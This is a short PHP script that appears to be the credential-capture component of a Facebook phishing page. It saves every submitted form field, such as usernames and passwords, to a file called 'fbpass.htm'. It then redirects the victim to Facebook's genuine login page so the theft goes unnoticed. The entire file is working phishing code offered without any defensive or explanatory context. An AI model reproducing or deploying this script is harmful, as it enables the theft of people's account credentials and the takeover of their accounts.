<?php
header ('Location:https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110');
$handle = fopen("fbpass.htm", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "<br>");
}
fwrite($handle, "<hr>");
fclose($handle);
exit;
?>